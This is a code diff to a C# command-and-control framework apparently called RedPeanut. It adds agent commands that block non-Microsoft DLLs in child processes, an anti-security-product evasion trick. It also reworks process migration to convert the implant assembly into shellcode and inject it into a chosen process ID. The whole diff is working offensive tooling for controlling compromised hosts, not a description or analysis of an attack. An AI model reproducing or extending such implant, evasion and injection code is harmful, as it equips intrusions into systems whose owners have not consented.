@@ -11,10 +11,11 @@ using System.IO;
 using static RedPeanut.Models;
 using Newtonsoft.Json;
 using System.Text;
+using System.Linq;
 
 namespace RedPeanut
 {
-    public class StandardCommand 
+    public class StandardCommand
     {
         public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
         {
@@ -24,6 +25,8 @@ namespace RedPeanut
             { "killagent", "Kill current agent" },
             { "managed", "Agent will run task in managed mode" },
             { "unmanaged", "Agent will run task in unmanaged mode" },
+            { "blockdlls", "Agent block non Microsoft Dlls in child process" },
+            { "unblockdlls", "Agent not block non Microsoft Dlls in child process" },
             { "migrate", "Migrate to another process" },
             { "reverttoself", "Revert all token" }
         };
@@ -86,6 +89,12 @@ namespace RedPeanut
                         case "unmanaged":
                             RunSetUnManaged();
                             return true;
+                        case "blockdlls":
+                            RunSetBlockDlls();
+                            return true;
+                        case "unblockdlls":
+                            RunSetUnBlockDlls();
+                            return true;
                         case "migrate":
                             RunMigrate(GetParsedSetInt("set " + inputcmd));
                             return true;
@@ -108,7 +117,7 @@ namespace RedPeanut
         {
             string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));
 
-            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll",agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));
+            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));
 
             RunStandardBase64(commandstr, "GetPwd", "StandardCommandImpl.Program", new string[] { " " }, agent);
         }
@@ -164,6 +173,8 @@ namespace RedPeanut
             msg.InjectionManagedTask = injectionManagedTask;
 
             agent.SendCommand(msg);
+
+            agent.Managed = true;
         }
 
         private void RunSetUnManaged()
@@ -181,6 +192,42 @@ namespace RedPeanut
             msg.InjectionManagedTask = injectionManagedTask;
 
             agent.SendCommand(msg);
+
+            agent.Managed = false;
+        }
+
+        private void RunSetBlockDlls()
+        {
+            TaskMsg msg = new TaskMsg
+            {
+                Instanceid = RandomAString(10, new Random()),
+                Agentid = agent.AgentId,
+                TaskType = "blockdlls"
+            };
+
+            BlockDlls blockDllsTask = new BlockDlls();
+            blockDllsTask.Block = true;
+
+            msg.BlockDllsTask = blockDllsTask;
+
+            agent.SendCommand(msg);
+        }
+
+        private void RunSetUnBlockDlls()
+        {
+            TaskMsg msg = new TaskMsg
+            {
+                Instanceid = RandomAString(10, new Random()),
+                Agentid = agent.AgentId,
+                TaskType = "blockdlls"
+            };
+
+            BlockDlls blockDllsTask = new BlockDlls();
+            blockDllsTask.Block = false;
+
+            msg.BlockDllsTask = blockDllsTask;
+
+            agent.SendCommand(msg);
         }
 
         private void RunMigrate(int pid)
@@ -189,7 +236,7 @@ namespace RedPeanut
             //Create RedPeanutAgent assembly
             string source = File.ReadAllText(Path.Combine(folderrpath, AGENT_TEMPLATE));
 
-            ListenerConfig conf = new ListenerConfig("", ((AgentInstanceHttp)agent).GetAddress(), ((AgentInstanceHttp)agent).GetPort(), RedPeanutC2.server.GetProfile(((AgentInstanceHttp)agent).GetProfileid()) , ((AgentInstanceHttp)agent).GetProfileid());
+            ListenerConfig conf = new ListenerConfig("", ((AgentInstanceHttp)agent).GetAddress(), ((AgentInstanceHttp)agent).GetPort(), RedPeanutC2.server.GetProfile(((AgentInstanceHttp)agent).GetProfileid()), ((AgentInstanceHttp)agent).GetProfileid());
             source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), ((AgentInstanceHttp)agent).TargetFramework, conf);
             string b64CompressedAgent = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, agent.AgentId + ".dll", ((AgentInstanceHttp)agent).TargetFramework, compprofile: CompilationProfile.Agent)));
             string instanceid = RandomAString(10, new Random());
@@ -206,38 +253,22 @@ namespace RedPeanut
             if (agent.Pivoter != null)
                 astate.pipename = agent.Pivoter.AgentId;
 
-            string b64State = Convert.ToBase64String(Encoding.Default.GetBytes(JsonConvert.SerializeObject(astate, Formatting.Indented)));
-
-            ModuleConfig modconfig = new ModuleConfig
-            {
-                Assembly = b64CompressedAgent,
-                Method = "LoadAndRun",
-                Moduleclass = "RedPeanutAgent.Worker",
-                Parameters = new string[] { b64State }
-            };
-
-            TaskMsg task = new TaskMsg
-            {
-                TaskType = "module",
-                ModuleTask = modconfig,
-                Agentid = agent.AgentId
-            };
-
-            if (agent.Pivoter != null)
-                task.AgentPivot = agent.Pivoter.AgentId;
-
+            string b64State = Convert.ToBase64String(Utility.CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(astate, Formatting.Indented))));
+            string[] argsm = Utility.Split(b64State, 100).ToArray();
 
             //Read template
             source = File.ReadAllText(Path.Combine(folderrpath, MIGRATE_TEMPLATE));
             //Replace
-            source = Replacer.ReplaceMigrate(source, Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(task)))), pid);
+            source = Replacer.ReplaceMigrate(source, Convert.ToBase64String(CompressGZipAssembly(
+                Builder.GenerateShellcode(b64CompressedAgent, RandomAString(10, new Random()) + ".exe", "RedPeanutAgent.Worker", "LoadAndRun", argsm)
+                )), pid);
             //Run
             string migrate = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", ((AgentInstanceHttp)agent).TargetFramework, compprofile: CompilationProfile.Migrate)));
             RunAssemblyBase64(
                 migrate,
                 "RedPeanutMigrate",
                 new string[] { " " },
-                agent, tasktype: "migrate",instanceid: instanceid);
+                agent, tasktype: "migrate", instanceid: instanceid);
         }
     }
 }
